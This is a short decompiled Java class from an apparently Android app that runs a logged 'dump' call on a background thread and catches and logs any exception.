package com.network.media;

import com.network.android.agent.NetworkApp;
import com.network.android.c.a.a;

/* access modifiers changed from: package-private */
public final class g implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ String f167a;

    g(String str) {
        this.f167a = str;
    }

    public final void run() {
        try {
            a.a("Dump performDumpInANewThread");
            f.b(NetworkApp.a(), this.f167a);
        } catch (Throwable th) {
            a.a("Dump performDumpInANewThread exception" + th.getMessage(), th);
        }
    }
}
